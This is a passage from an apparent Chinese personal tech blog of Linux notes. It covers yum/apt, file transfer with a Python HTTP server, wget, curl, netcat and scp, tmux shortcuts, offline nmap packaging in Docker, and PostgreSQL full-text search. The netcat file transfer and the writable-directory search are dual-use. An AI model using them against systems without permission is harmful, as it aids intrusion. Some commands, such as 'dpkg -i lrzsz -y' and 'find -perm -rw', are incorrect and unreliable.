<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum clean packages       # 清除缓存目录下的软件包</span><br><span class="line">yum clean headers        # 清除缓存目录下的 headers</span><br><span class="line">yum clean oldheaders     # 清除缓存目录下旧的 headers</span><br></pre></td></tr></table></figure>

<h4 id="apt"><a href="#apt" class="headerlink" title="apt"></a>apt</h4><p>安装一个新软件包：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install packagename</span><br></pre></td></tr></table></figure>

<p>卸载一个已安装的软件包（保留配置文件）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get remove packagename</span><br></pre></td></tr></table></figure>

<p>卸载一个已安装的软件包（删除配置文件）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get –purge remove packagename</span><br></pre></td></tr></table></figure>

<p>会把已装或已卸的软件都备份在硬盘上，所以如果需要空间的话，可以让这个命令来删除你已经删掉的软件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get autoclean apt</span><br></pre></td></tr></table></figure>

<p>这个命令会把安装的软件的备份也删除，不过这样不会影响软件的使用的：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get clean</span><br></pre></td></tr></table></figure>

<p>更新所有已安装的软件包：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get upgrade</span><br></pre></td></tr></table></figure>

<p>将系统升级到新版本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get dist-upgrade</span><br></pre></td></tr></table></figure>

<p>定期运行这个命令来清除那些已经卸载的软件包的.deb文件。通过这种方式，您可以释放大量的磁盘空间。如果您的需求十分迫切，可以使用<code>apt-get clean</code>以释放更多空间。这个命令会将已安装软件包裹的.deb文件一并删除。大多数情况下您不会再用到这些.debs文件，因此如果您为磁盘空间不足 而感到焦头烂额，这个办法也许值得一试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get autoclean</span><br></pre></td></tr></table></figure>

<h3 id="配置国内加速源"><a href="#配置国内加速源" class="headerlink" title="配置国内加速源"></a>配置国内加速源</h3><p><a href="https://blog.csdn.net/john1337/article/details/111310445">ubuntu20.04配置国内apt源_ubuntu2204添加apt源-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/bluemoonstars1977/article/details/97827632">修改 CentOS 默认的yum源为国内镜像以加快下载速度_centos换镜像源下载速度会块吗-CSDN博客</a></p>
<h3 id="linux传输文件的几种方式"><a href="#linux传输文件的几种方式" class="headerlink" title="linux传输文件的几种方式"></a>linux传输文件的几种方式</h3><h4 id="Linux环境启动http服务"><a href="#Linux环境启动http服务" class="headerlink" title="Linux环境启动http服务"></a>Linux环境启动http服务</h4><p>python2: python2 -m SimpleHTTPServer 8099</p>
<p>python3: python3 -m http.server 8099</p>
<p>将当前目录通过http服务映射出来</p>
<p><strong>下载：</strong></p>
<h5 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h5><p>wget <a href="http://ip:8099/snmp.tar.gz">http://ip:8099/snmp.tar.gz</a> -O snmp1.tar.gz </p>
<p>-O 文件重命名</p>
<p>-c 断点续传</p>
<p>-P &#x2F;tmp 保存到哪个文件夹下</p>
<h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><ol>
<li>文件上传</li>
</ol>
<p>  <code>-F</code> 参数用来向服务器上传二进制文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -F &#x27;file=@photo.png&#x27; https://example.com/profile</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上面命令会给 HTTP 请求加上标头 Content-Type: multipart/form-data ，然后将文件photo.png作为file字段上传。</span></span><br></pre></td></tr></table></figure>

<p><code>-F</code> 参数可以指定 <code>MIME</code> 类型。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -F &#x27;file=@photo.png;type=image/png&#x27; https://example.com/profile</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上面命令指定 MIME 类型为image/png，否则 curl 会把 MIME 类型设为 application/octet-stream。</span></span><br></pre></td></tr></table></figure>

<p><code>-F</code> 参数也可以指定文件名。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -F &#x27;file=@photo.png;filename=me.png&#x27; https://example.com/profile</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上面命令中，原始文件名为photo.png，但是服务器接收到的文件名为me.png。</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>文件下载<br>Curl 下载文件时使用 -O 选项，默认使用网络文件的名字作为本地文件名。<br>文件下载方式有：</li>
</ol>
<ul>
<li><p>可以使用重定向保存到指定文件： … &gt;&gt; index.html</p>
</li>
<li><p>如果想要为下载的文件指定名称，则使用 -o 代替 -O，<code>curl -o file2.pdf www.example.com/file.pdf</code></p>
</li>
<li><p>-# ，显示下载进度和速度等信息，可使用 -s 关闭显示</p>
</li>
<li><p>–limit-rate ，设置下载时最大下载速度，如 –limit-rate 1m</p>
</li>
<li><p>使用 -C 参数可以设置开启断点续传<br><code>curl -C -O http://www.linux.com/dodo1.JPG</code></p>
</li>
</ul>
<ol start="3">
<li>批量下载文件</li>
</ol>
<p>curl 还支持下载多个文件，只需要多次指定 -O 和文件地址即可，如 <code>curl -O [URL1] -O [URL2] -O [URL3] ...</code><br>如果多个文件地址符合规律，可以使用正则来批量下载：<code>curl -O ftp://ftp.example.com/file[1-30].jpg</code></p>
<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><blockquote>
<p>-n 直接使用IP地址，而不通过域名服务器。<br>-p&lt;通信端口&gt; # 设置本地主机使用的通信端口。<br>-l 使用监听模式，管控传入的资料。<br>-v 显示指令执行过程。</p>
</blockquote>
<p>首先，在接受文件端使用命令：</p>
<blockquote>
<p>nc -l 1234 &gt; file.txt</p>
</blockquote>
<p>即：将从端口1234监听到的信息输出到file.txt中</p>
<p>然后，在发送文件端使用命令：</p>
<blockquote>
<p>nc ip地址 1234 &lt; file.txt</p>
</blockquote>
<p>即：从文件file.txt发送到对应ip的1234端口</p>
<p>当文件传输后，接收文件端的nc进程会自动退出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 如果希望文件传输结束后自动退出，可以使用下面的命令：</span><br><span class="line">nc -lp 8888 &gt; node.tar.gz</span><br><span class="line">nc -nv 192.168.75.121 8888 -i 1 &lt; node_exporter-1.3.1.linux-amd64.tar.gz</span><br><span class="line"># ⚠️ 注意：如果希望文件传输结束后自动退出,可以加上-i，-i 表示闲置超时时间</span><br></pre></td></tr></table></figure>

<h4 id="sftp"><a href="#sftp" class="headerlink" title="sftp"></a>sftp</h4><p>建立连接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sftp username@1.1.1.1 <span class="comment"># 回车输入密码</span></span></span><br></pre></td></tr></table></figure>

<p>获取文件下载到指定路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">sftp&gt; </span><span class="language-bash">get /export/sftp/test.csv /Users/my/Downloads</span></span><br></pre></td></tr></table></figure>

<p>上传本地文件到服务器指定路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">sftp&gt; </span><span class="language-bash">put /Users/my/Downloads/re-produce.gif /export/sftp</span></span><br></pre></td></tr></table></figure>

<h4 id="rz、sz"><a href="#rz、sz" class="headerlink" title="rz、sz"></a>rz、sz</h4><p>rz sz指令可以实现linux和windows之间的文件传输，但要求在windows客户端要安装Xshell或SecureCRT远程连接工具。</p>
<p>linux安装命令如下：<br>redHat、centos、Fedora系统 yum install lrzsz -y<br>ubuntu系统 dpkg -i lrzsz -y</p>
<p>上传命令格式：rz 回车后会弹出windows窗口，然后选择文件。默认下载到当前目录<br>下载命令格式：<code>sz 文件名</code></p>
<p>注意：当遇到rz 、sz无法上传或者下载，已经存在的文件的时候，可以使用<code>rz -y</code>是覆盖上传<code>sz -y</code>则是覆盖下载</p>
<h4 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h4><p>用于在Linux下进行远程拷贝文件的命令</p>
<p>-r： 递归复制整个目录。</p>
<p>-v：详细方式显示输出。scp和ssh(1)会显示出整个过程的调试信息。这些信息用于调试连接，验证和配置问题。</p>
<p>-P port：注意是大写的P, port是指定数据传输用到的端口号</p>
<p>从目标主机copy到本地实例：<code>scp -rp 172.24.5.12:/home/wsupport /home/wsupport/</code></p>
<p>从本地copy到目标实例：<code>scp spm.war 172.24.5.12:/home/wsupport</code></p>
<h4 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h4><p>很麻烦，需要开端口（设置iptables规则）、关闭防火墙等配置。<a href="https://blog.csdn.net/wxh0000mm/article/details/89152421">LINUX命令行下访问FTP服务器_linux如何拉取ftp服务器上的包-CSDN博客</a></p>
<h3 id="查找文件命令"><a href="#查找文件命令" class="headerlink" title="查找文件命令"></a>查找文件命令</h3><p>grep | find | locate | whereis | which | vim</p>
<p><a href="https://cloud.tencent.com/developer/article/1856139">linux必学的文件及内容查找命令-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<h3 id="查找可读写目录"><a href="#查找可读写目录" class="headerlink" title="查找可读写目录"></a>查找可读写目录</h3><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> /<span class="built_in">path</span>/to/start -<span class="built_in">type</span> d -executable</span><br></pre></td></tr></table></figure>

<p>在上面的命令中，你需要将<code>/path/to/start</code>替换为你要开始搜索的路径。该命令将从指定的路径开始递归地搜索所有目录，并返回所有<strong>可执行目录</strong>的路径。</p>
<p>如果你想要只查找<strong>可读写的目录</strong>，你可以使用<code>-perm</code>选项来指定权限要求。以下是一个示例命令：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> /<span class="built_in">path</span>/to/start -<span class="built_in">type</span> d -perm -rw</span><br><span class="line">或者</span><br><span class="line"><span class="built_in">find</span> /<span class="built_in">path</span>/to/start -<span class="built_in">type</span> d -readable -writable</span><br></pre></td></tr></table></figure>

<p>请注意，对于<code>-executable</code>和<code>-readable</code>、<code>-writable</code>选项，你需要具有足够的权限来执行这些操作。如果你没有足够的权限，某些目录可能会被忽略。</p>
<h3 id="解压缩命令"><a href="#解压缩命令" class="headerlink" title="解压缩命令"></a>解压缩命令</h3><p><a href="https://zhuanlan.zhihu.com/p/152623706">Linux 压缩和解压缩命令（详细总结） - 知乎 (zhihu.com)</a></p>
]]></content>
      <tags>
        <tag>学习计划</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Tmux使用</title>
    <url>/2023/07/05/Tmux%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="Tmux使用"><a href="#Tmux使用" class="headerlink" title="Tmux使用"></a>Tmux使用</h2><blockquote>
<p>参考链接：<a href="https://cloud.tencent.com/developer/article/1526675">可能是东半球最全面易懂的 Tmux 使用教程！( 强烈建议收藏 )-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
</blockquote>
<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><p>tmux</p>
<h4 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h4><p> ctrl+d或者exit</p>
<h4 id="会话管理"><a href="#会话管理" class="headerlink" title="会话管理"></a>会话管理</h4><span id="more"></span>

<h5 id="新建会话"><a href="#新建会话" class="headerlink" title="新建会话"></a>新建会话</h5><p>tmux new -s 编号或名称</p>
<h5 id="分离会话"><a href="#分离会话" class="headerlink" title="分离会话"></a>分离会话</h5><p>tmux detach</p>
<h5 id="查看当前所有的-Tmux-会话"><a href="#查看当前所有的-Tmux-会话" class="headerlink" title="查看当前所有的 Tmux 会话"></a>查看当前所有的 Tmux 会话</h5><p>tmux ls</p>
<p>或者</p>
<p>tmux list-session</p>
<h5 id="接入会话"><a href="#接入会话" class="headerlink" title="接入会话"></a>接入会话</h5><p>tmux attach -t 编号或名称</p>
<h5 id="杀死会话"><a href="#杀死会话" class="headerlink" title="杀死会话"></a>杀死会话</h5><p>tmux kill-session -t 编号或名称</p>
<h5 id="切换会话"><a href="#切换会话" class="headerlink" title="切换会话"></a>切换会话</h5><p>tmux switch -t 编号或名称</p>
<h5 id="重命名会话"><a href="#重命名会话" class="headerlink" title="重命名会话"></a>重命名会话</h5><p>tmux rename-session -t 0 <new-name><br>上面命令将0号会话重命名。</new-name></p>
<h5 id="会话快捷键"><a href="#会话快捷键" class="headerlink" title="会话快捷键"></a>会话快捷键</h5><ul>
<li><code>Ctrl+b d</code>：分离当前会话。</li>
<li><code>Ctrl+b s</code>：列出所有会话。</li>
<li><code>Ctrl+b $</code>：重命名当前会话。</li>
</ul>
<h4 id="窗格管理"><a href="#窗格管理" class="headerlink" title="窗格管理"></a>窗格管理</h4><h5 id="划分上下两个窗格"><a href="#划分上下两个窗格" class="headerlink" title="划分上下两个窗格"></a>划分上下两个窗格</h5><p>tmux split-window</p>
<h5 id="划分左右两个窗格"><a href="#划分左右两个窗格" class="headerlink" title="划分左右两个窗格"></a>划分左右两个窗格</h5><p>tmux split-window -h</p>
<h5 id="光标切换到上方窗格"><a href="#光标切换到上方窗格" class="headerlink" title="光标切换到上方窗格"></a>光标切换到上方窗格</h5><p>tmux select-pane -U</p>
<h5 id="光标切换到下方窗格"><a href="#光标切换到下方窗格" class="headerlink" title="光标切换到下方窗格"></a>光标切换到下方窗格</h5><p>tmux select-pane -D</p>
<h5 id="光标切换到左边窗格"><a href="#光标切换到左边窗格" class="headerlink" title="光标切换到左边窗格"></a>光标切换到左边窗格</h5><p>tmux select-pane -L</p>
<h5 id="光标切换到右边窗格"><a href="#光标切换到右边窗格" class="headerlink" title="光标切换到右边窗格"></a>光标切换到右边窗格</h5><p>tmux select-pane -R</p>
<h5 id="窗格上移"><a href="#窗格上移" class="headerlink" title="窗格上移"></a>窗格上移</h5><p>tmux swap-pane -U</p>
<h5 id="窗格下移"><a href="#窗格下移" class="headerlink" title="窗格下移"></a>窗格下移</h5><p>tmux swap-pane -D</p>
<h5 id="窗格快捷键"><a href="#窗格快捷键" class="headerlink" title="窗格快捷键"></a>窗格快捷键</h5><p>Ctrl+b %：划分左右两个窗格。<br>Ctrl+b “：划分上下两个窗格。<br>Ctrl+b <arrow key>：光标切换到其他窗格。<arrow key>是指向要切换到的窗格的方向键，比如切换到下方窗格，就按方向键↓。<br>Ctrl+b ;：光标切换到上一个窗格。<br>Ctrl+b o：光标切换到下一个窗格。<br>Ctrl+b {：当前窗格与上一个窗格交换位置。<br>Ctrl+b }：当前窗格与下一个窗格交换位置。<br>Ctrl+b Ctrl+o：所有窗格向前移动一个位置，第一个窗格变成最后一个窗格。<br>Ctrl+b Alt+o：所有窗格向后移动一个位置，最后一个窗格变成第一个窗格。<br>Ctrl+b x：关闭当前窗格。<br>Ctrl+b !：将当前窗格拆分为一个独立窗口。<br>Ctrl+b z：当前窗格全屏显示，再使用一次会变回原来大小。<br>Ctrl+b Ctrl+<arrow key>：按箭头方向调整窗格大小。<br>Ctrl+b q：显示窗格编号。</arrow></arrow></arrow></p>
<h4 id="窗口管理"><a href="#窗口管理" class="headerlink" title="窗口管理"></a>窗口管理</h4><h5 id="新建窗口"><a href="#新建窗口" class="headerlink" title="新建窗口"></a>新建窗口</h5><p>tmux new-window</p>
<p>新建一个指定名称的窗口</p>
<p>tmux new-window -n <window-name></window-name></p>
<h5 id="切换窗口"><a href="#切换窗口" class="headerlink" title="切换窗口"></a>切换窗口</h5><p>tmux select-window命令用来切换窗口。</p>
<p>切换到指定编号的窗口</p>
<p>tmux select-window -t <window-number></window-number></p>
<p>切换到指定名称的窗口</p>
<p>tmux select-window -t <window-name></window-name></p>
<h5 id="重命名窗口"><a href="#重命名窗口" class="headerlink" title="重命名窗口"></a>重命名窗口</h5><p>tmux rename-window命令用于为当前窗口起名（或重命名）。</p>
<p>tmux rename-window <new-name></new-name></p>
<h5 id="窗口快捷键"><a href="#窗口快捷键" class="headerlink" title="窗口快捷键"></a>窗口快捷键</h5><p>Ctrl+b c：创建一个新窗口，状态栏会显示多个窗口的信息。<br>Ctrl+b p：切换到上一个窗口（按照状态栏上的顺序）。<br>Ctrl+b n：切换到下一个窗口。<br>Ctrl+b <number>：切换到指定编号的窗口，其中的<number>是状态栏上的窗口编号。<br>Ctrl+b w：从列表中选择窗口。<br>Ctrl+b ,：窗口重命名。</number></number></p>
<h4 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h4><p>列出所有快捷键，及其对应的 Tmux 命令</p>
<p>tmux list-keys</p>
<p>列出所有 Tmux 命令及其参数</p>
<p>tmux list-commands</p>
<p>列出当前所有 Tmux 会话的信息</p>
<p>tmux info</p>
<p>重新加载当前的 Tmux 配置</p>
<p>tmux source-file ~&#x2F;.tmux.conf</p>
<p>帮助命令的快捷键是<code>Ctrl+b ?</code> ，esc键或者q退出</p>
]]></content>
      <tags>
        <tag>Tmux</tag>
      </tags>
  </entry>
  <entry>
    <title>centos离线包制作</title>
    <url>/2023/11/13/centos%E7%A6%BB%E7%BA%BF%E5%8C%85%E5%88%B6%E4%BD%9C/</url>
    <content><![CDATA[<h3 id="centos离线包制作-docker安装"><a href="#centos离线包制作-docker安装" class="headerlink" title="centos离线包制作+docker安装"></a>centos离线包制作+docker安装</h3><p><a href="https://cubesec.yuque.com/staff-qa9e6n/qiiowe/kzfbwfeylexd9cik">陈谊桦+第一次作业+20231114 (yuque.com)</a></p>
<span id="more"></span>

<h4 id="在docker中实现离线安装nmap"><a href="#在docker中实现离线安装nmap" class="headerlink" title="在docker中实现离线安装nmap"></a>在docker中实现离线安装nmap</h4><h5 id="下载CentOS镜像"><a href="#下载CentOS镜像" class="headerlink" title="下载CentOS镜像"></a>下载CentOS镜像</h5><h5 id="运行Docker容器并映射宿主机上的-root-tmp目录到容器内的-tmp-tmp1目录"><a href="#运行Docker容器并映射宿主机上的-root-tmp目录到容器内的-tmp-tmp1目录" class="headerlink" title="运行Docker容器并映射宿主机上的&#x2F;root&#x2F;tmp目录到容器内的&#x2F;tmp&#x2F;tmp1目录"></a>运行Docker容器并映射宿主机上的&#x2F;root&#x2F;tmp目录到容器内的&#x2F;tmp&#x2F;tmp1目录</h5><h5 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h5><img data-src="/2023/11/13/centos%E7%A6%BB%E7%BA%BF%E5%8C%85%E5%88%B6%E4%BD%9C/image-20231113170625489.png" class title="image-20231113170625489">

<h5 id="在容器内更新源"><a href="#在容器内更新源" class="headerlink" title="在容器内更新源"></a>在容器内更新源</h5><img data-src="/2023/11/13/centos%E7%A6%BB%E7%BA%BF%E5%8C%85%E5%88%B6%E4%BD%9C/image-20231113172251123.png" class title="image-20231113172251123">

<h5 id="开启-yum-的缓存功能"><a href="#开启-yum-的缓存功能" class="headerlink" title="开启 yum 的缓存功能"></a>开启 yum 的缓存功能</h5><img data-src="/2023/11/13/centos%E7%A6%BB%E7%BA%BF%E5%8C%85%E5%88%B6%E4%BD%9C/image-20231113172231486.png" class title="image-20231113172231486">

<h5 id="安装nmap"><a href="#安装nmap" class="headerlink" title="安装nmap"></a>安装nmap</h5><img data-src="/2023/11/13/centos%E7%A6%BB%E7%BA%BF%E5%8C%85%E5%88%B6%E4%BD%9C/image-20231114114355749.png" class title="image-20231114114355749">

<h5 id="去到nmap的安装目录下打包nmap包"><a href="#去到nmap的安装目录下打包nmap包" class="headerlink" title="去到nmap的安装目录下打包nmap包"></a>去到nmap的安装目录下打包nmap包</h5><img data-src="/2023/11/13/centos%E7%A6%BB%E7%BA%BF%E5%8C%85%E5%88%B6%E4%BD%9C/image-20231114150742475.png" class title="image-20231114150742475">

<img data-src="/2023/11/13/centos%E7%A6%BB%E7%BA%BF%E5%8C%85%E5%88%B6%E4%BD%9C/image-20231114150800345.png" class title="image-20231114150800345">

<img data-src="/2023/11/13/centos%E7%A6%BB%E7%BA%BF%E5%8C%85%E5%88%B6%E4%BD%9C/image-20231114150812438.png" class title="image-20231114150812438">

<img data-src="/2023/11/13/centos%E7%A6%BB%E7%BA%BF%E5%8C%85%E5%88%B6%E4%BD%9C/image-20231114150906213.png" class title="image-20231114150906213">

<img data-src="/2023/11/13/centos%E7%A6%BB%E7%BA%BF%E5%8C%85%E5%88%B6%E4%BD%9C/image-20231114151134199.png" class title="image-20231114151134199">

<h5 id="在-tmp-tmp1下新建nmap文件夹"><a href="#在-tmp-tmp1下新建nmap文件夹" class="headerlink" title="在&#x2F;tmp&#x2F;tmp1下新建nmap文件夹"></a>在&#x2F;tmp&#x2F;tmp1下新建nmap文件夹</h5><h5 id="将打包好的nmap包移动到-tmp-tmp1-nmap"><a href="#将打包好的nmap包移动到-tmp-tmp1-nmap" class="headerlink" title="将打包好的nmap包移动到&#x2F;tmp&#x2F;tmp1&#x2F;nmap"></a>将打包好的nmap包移动到&#x2F;tmp&#x2F;tmp1&#x2F;nmap</h5><img data-src="/2023/11/13/centos%E7%A6%BB%E7%BA%BF%E5%8C%85%E5%88%B6%E4%BD%9C/image-20231114151200106.png" class title="image-20231114151200106">

<img data-src="/2023/11/13/centos%E7%A6%BB%E7%BA%BF%E5%8C%85%E5%88%B6%E4%BD%9C/image-20231114151215872.png" class title="image-20231114151215872">

<h5 id="将nmap-tar-gz文件从Docker容器复制到宿主机的根目录下"><a href="#将nmap-tar-gz文件从Docker容器复制到宿主机的根目录下" class="headerlink" title="将nmap.tar.gz文件从Docker容器复制到宿主机的根目录下"></a>将nmap.tar.gz文件从Docker容器复制到宿主机的根目录下</h5><img data-src="/2023/11/13/centos%E7%A6%BB%E7%BA%BF%E5%8C%85%E5%88%B6%E4%BD%9C/image-20231114151404265.png" class title="image-20231114151404265">

<h4 id="在linux系统中安装docker"><a href="#在linux系统中安装docker" class="headerlink" title="在linux系统中安装docker"></a>在linux系统中安装docker</h4><h5 id="卸载旧版本docker-如果之前没有装过docker可以忽略"><a href="#卸载旧版本docker-如果之前没有装过docker可以忽略" class="headerlink" title="卸载旧版本docker(如果之前没有装过docker可以忽略)"></a>卸载旧版本docker(如果之前没有装过docker可以忽略)</h5><h5 id="安装-yum-utils-包"><a href="#安装-yum-utils-包" class="headerlink" title="安装 yum-utils 包"></a>安装 yum-utils 包</h5><img data-src="/2023/11/13/centos%E7%A6%BB%E7%BA%BF%E5%8C%85%E5%88%B6%E4%BD%9C/image-20231114152542284.png" class title="image-20231114152542284">

<h5 id="配置稳定源"><a href="#配置稳定源" class="headerlink" title="配置稳定源"></a>配置稳定源</h5><h5 id="更新一下yum缓存"><a href="#更新一下yum缓存" class="headerlink" title="更新一下yum缓存"></a>更新一下yum缓存</h5><img data-src="/2023/11/13/centos%E7%A6%BB%E7%BA%BF%E5%8C%85%E5%88%B6%E4%BD%9C/image-20231114152620031.png" class title="image-20231114152620031">

<h5 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h5><img data-src="/2023/11/13/centos%E7%A6%BB%E7%BA%BF%E5%8C%85%E5%88%B6%E4%BD%9C/image-20231114152658453.png" class title="image-20231114152658453">

<h5 id="验证是否安装成功"><a href="#验证是否安装成功" class="headerlink" title="验证是否安装成功"></a>验证是否安装成功</h5><img data-src="/2023/11/13/centos%E7%A6%BB%E7%BA%BF%E5%8C%85%E5%88%B6%E4%BD%9C/image-20231114154145888.png" class title="image-20231114154145888">
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>postgresql全文检索</title>
    <url>/2023/06/28/postgresql%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2/</url>
    <content><![CDATA[<h3 id="postgresql全文检索"><a href="#postgresql全文检索" class="headerlink" title="postgresql全文检索"></a>postgresql全文检索</h3><h4 id="to-tsvector-只搜索正规的词"><a href="#to-tsvector-只搜索正规的词" class="headerlink" title="to_tsvector(只搜索正规的词)"></a>to_tsvector(只搜索正规的词)</h4><ul>
<li>作用：解析文档</li>
</ul>
<p><code>to_tsvector</code>把一个文本文档解析成记号，把记号缩减成词位，并且返回一个<code>tsvector</code>，它列出了词位以及词位在文档中的位置。文档被根据指定的或默认的文本搜索配置来处理。下面是一个简单例子：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> to_tsvector(<span class="string">&#x27;english&#x27;</span>, <span class="string">&#x27;a fat  cat sat on a mat - it ate a fat rats&#x27;</span>);</span><br><span class="line">                  to_tsvector</span><br><span class="line"><span class="comment">-----------------------------------------------------</span></span><br><span class="line"> <span class="string">&#x27;ate&#x27;</span>:<span class="number">9</span> <span class="string">&#x27;cat&#x27;</span>:<span class="number">3</span> <span class="string">&#x27;fat&#x27;</span>:<span class="number">2</span>,<span class="number">11</span> <span class="string">&#x27;mat&#x27;</span>:<span class="number">7</span> <span class="string">&#x27;rat&#x27;</span>:<span class="number">12</span> <span class="string">&#x27;sat&#x27;</span>:<span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>在上面这个例子中我们看到，作为结果的<code>tsvector</code>不包含词<code>a</code>、<code>on</code>或<code>it</code>，词<code>rats</code>变成了<code>rat</code>，并且标点符号<code>-</code>被忽略了。</p>
<span id="more"></span>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> to_tsvector(<span class="string">&#x27;y:1A a:2B,5B r:4D u:3C&#x27;</span>);</span><br></pre></td></tr></table></figure>

<img data-src="/2023/06/28/postgresql%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2/image-20230628102548367.png" class title="image-20230628102548367">

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> to_tsvector(<span class="string">&#x27;english&#x27;</span>, <span class="string">&#x27;The Fat Rats&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> to_tsvector(<span class="string">&#x27;english&#x27;</span>, <span class="string">&#x27;yaura is a beauty&#x27;</span>);</span><br></pre></td></tr></table></figure>

<img data-src="/2023/06/28/postgresql%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2/image-20230628102740319.png" class title="image-20230628102740319">

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> to_tsvector(<span class="string">&#x27;yaura is a beauty&#x27;</span>);</span><br></pre></td></tr></table></figure>

<img data-src="/2023/06/28/postgresql%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2/image-20230628103316394.png" class title="image-20230628103316394">

<h4 id="to-tsquery-正规"><a href="#to-tsquery-正规" class="headerlink" title="to_tsquery(正规)"></a>to_tsquery(正规)</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> to_tsquery(<span class="string">&#x27;FAt:ab &amp; caTs&#x27;</span>);</span><br></pre></td></tr></table></figure>

<img data-src="/2023/06/28/postgresql%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2/image-20230628164606367.png" class title="image-20230628164606367">

<h4 id><a href="#" class="headerlink" title="@@"></a>@@</h4><ul>
<li>作用：将查询与文档匹配 返回真或假</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> to_tsvector(<span class="string">&#x27;postgreduate&#x27;</span>) @@ to_tsquery(<span class="string">&#x27;postgres:*&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> to_tsvector(<span class="string">&#x27;postgresduate&#x27;</span>) @@ to_tsquery(<span class="string">&#x27;postgres:*&#x27;</span>);</span><br></pre></td></tr></table></figure>

<img data-src="/2023/06/28/postgresql%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2/image-20230628164414210.png" class title="image-20230628164414210">

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> to_tsvector(<span class="string">&#x27;yaura&#x27;</span>)@<span class="variable">@to_tsquery</span>(<span class="string">&#x27;beauty&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> to_tsvector(<span class="string">&#x27;yaura is a beauty&#x27;</span>)@<span class="variable">@to_tsquery</span>(<span class="string">&#x27;beauty&#x27;</span>);</span><br></pre></td></tr></table></figure>

<img data-src="/2023/06/28/postgresql%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2/image-20230628170402598.png" class title="image-20230628170402598">

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> to_tsvector(<span class="string">&#x27;yaura is a beauty&#x27;</span>)@@ <span class="string">&#x27;yaura &amp; is &amp; (a | beauty)&#x27;</span>::tsquery;</span><br><span class="line"><span class="keyword">select</span> to_tsvector(<span class="string">&#x27;yaura is a beauty&#x27;</span>)@@ <span class="string">&#x27;yaura &amp; !is &amp; (a | beauty)&#x27;</span>::tsquery;</span><br></pre></td></tr></table></figure>

<img data-src="/2023/06/28/postgresql%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2/image-20230628171247204.png" class title="image-20230628171247204">

<h4 id="ts-rank"><a href="#ts-rank" class="headerlink" title="ts_rank"></a>ts_rank</h4><ul>
<li>作用：衡量文档与特定查询的相关程度</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> ts_rank(</span><br><span class="line">to_tsvector(<span class="string">&#x27;yaura is a beauty&#x27;</span>),</span><br><span class="line">to_tsquery(<span class="string">&#x27;yaura&#x27;</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<img data-src="/2023/06/28/postgresql%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2/image-20230628165812112.png" class title="image-20230628165812112">

